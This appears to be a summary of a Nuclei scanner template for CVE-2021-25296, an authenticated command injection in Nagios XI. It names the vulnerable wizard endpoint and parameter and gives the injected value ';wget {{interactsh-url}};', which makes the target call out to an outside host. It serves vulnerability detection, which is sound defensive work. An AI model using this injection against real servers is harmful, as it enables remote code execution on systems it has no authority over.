---
cve_id: CVE-2021-25296
template_path: nuclei-templates/http/cves/2021/CVE-2021-25296.yaml
affected_product: Nagios XI
severity: high
authentication: required
external_callback: true
affected_versions: 5.5.6 through 5.7.5
preconditions: []
poc_classification: rce
---

## Vulnerability
Nagios XI 5.5.6 through 5.7.5 is susceptible to authenticated remote command injection. There is improper sanitization of authenticated user-controlled input by a single HTTP request via the file `/usr/local/nagiosxi/html/includes/configwizards/windowswmi/windowswmi.inc.php`. This in turn can lead to remote code execution, by which an attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system.

**Impact:** Successful exploitation allows authenticated attackers to execute arbitrary commands on the target system.  
**CVSS:** 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)  
**CWE:** CWE-78

## PoC / Detection
Classification: rce

The template performs a 4-request authenticated workflow: GET `/nagiosxi/login.php` (extract NSP token), POST login with `{{username}}`/`{{password}}`, GET `/nagiosxi/index.php` (extract `nsp_auth`), then GET `/nagiosxi/config/monitoringwizard.php?wizard=windowswmi` injecting `;wget {{interactsh-url}};` into the `plugin_output_len` parameter. Verification succeeds on DNS interaction via interactsh plus body keywords "Event Log" AND "Display Name" with HTTP 200 status.

## References
- https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs/blob/main/README.md
- https://github.com/rapid7/metasploit-framework/pull/17494
- http://nagios.com
- https://nvd.nist.gov/vuln/detail/CVE-2021-25296
- http://packetstormsecurity.com/files/170924/Nagios-XI-5.7.5-Remote-Code-Execution.html
